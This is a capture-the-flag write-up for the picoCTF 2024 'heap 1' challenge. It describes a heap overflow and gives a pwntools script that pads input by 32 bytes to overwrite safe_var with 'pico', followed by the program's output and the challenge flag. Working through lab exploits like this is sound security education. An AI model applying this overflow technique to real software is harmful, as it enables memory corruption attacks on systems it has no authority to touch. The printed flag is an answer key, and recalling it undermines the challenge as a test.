# heap 1 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2024, Heap Overflow

## Description ##
Can you control your overflow?

## Approach ##
I am provided with a binary file called `chall` and a C file called `chall.c`. Inspecting the C file, I am provided with similar code as in the previous challenge (heap 0), but with a few differences. `check_win` now checks if `safe_var` is equal to `pico`, other than that, the rest of the code seems to be the same.

Instead of overflowing the heap with arbitrary data, this challenge requires overwriting safe_var with a precise value ("pico"), meaning both the offset and payload contents must be exact. Thankfully, the address of `safe_var` and `input_data` locations are printed. Also, because both `input_data` and `safe_var` are allocated consecutively on the heap using malloc, their addresses are contiguous, making the byte offset between them reliable. So if I subtract the address location of `safe_var` from the address location of `input_data`, I can find the exact amount of bytes I need to write to overwrite the contents of `safe_var` with the string "pico". So I wrote a simple script that helps me automatically calculate the padding needed to change `safe_var` value to `pico`:

    from pwn import *

    HOST = 'tethys.picoctf.net'
    PORT = 49243

    p = remote(HOST, PORT)

    # Got from the instance 
    input_data_addr =  0x56af415b12b0
    safe_var_addr = 0x56af415b12d0

    # Calculate the padding
    padding = safe_var_addr - input_data_addr

    print(f"Padding: {padding}")

    # Write to buffer
    p.sendline(b'2')

    payload = b'a'*padding + b'pico'

    print(f"Payload: {payload}")

    # Overwrite safe_var value to pico.
    p.sendline(payload)

    # Tell the program to print the flag now
    p.sendline(b'4')

    p.interactive()

And running the script, I got the flag:

    Padding: 32
    Payload: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico'
    [*] Switching to interactive mode

    Welcome to heap1!
    I put my data on the heap so it should be safe from any tampering.
    Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data
    +-------------+----------------+
    [*]   0x61bee4a8d2b0  ->   pico
    +-------------+----------------+
    [*]   0x61bee4a8d2d0  ->   bico
    +-------------+----------------+

    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

    Enter your choice: Data for buffer:
    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

    Enter your choice:
    YOU WIN
    picoCTF{starting_to_get_the_hang_21306688}

Flag: picoCTF{starting_to_get_the_hang_21306688}

## Reflection ## 
This challenge isn't much different from the previous one, but it emphasizes calculating the exact number of bytes needed to overwrite a variable with a specific value. Regardless of the challenge, the core idea remains the same: unchecked input functions can lead to unintended heap memory modification and broken program logic.



